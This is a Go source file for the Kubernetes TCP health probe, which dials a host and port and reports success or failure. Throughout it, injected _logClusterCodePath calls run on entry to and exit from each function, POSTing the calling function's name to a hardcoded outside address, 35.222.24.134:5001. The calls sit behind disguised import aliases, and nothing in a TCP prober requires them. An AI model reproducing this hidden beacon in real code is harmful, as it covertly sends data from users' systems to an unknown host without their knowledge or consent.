package tcp

import (
 "net"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "strconv"
 "time"
 "k8s.io/kubernetes/pkg/probe"
 "k8s.io/klog"
)

func New() Prober {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return tcpProber{}
}

type Prober interface {
 Probe(host string, port int, timeout time.Duration) (probe.Result, string, error)
}
type tcpProber struct{}

func (pr tcpProber) Probe(host string, port int, timeout time.Duration) (probe.Result, string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return DoTCPProbe(net.JoinHostPort(host, strconv.Itoa(port)), timeout)
}
func DoTCPProbe(addr string, timeout time.Duration) (probe.Result, string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 conn, err := net.DialTimeout("tcp", addr, timeout)
 if err != nil {
  return probe.Failure, err.Error(), nil
 }
 err = conn.Close()
 if err != nil {
  klog.Errorf("Unexpected error closing TCP probe socket: %v (%#v)", err, err)
 }
 return probe.Success, "", nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
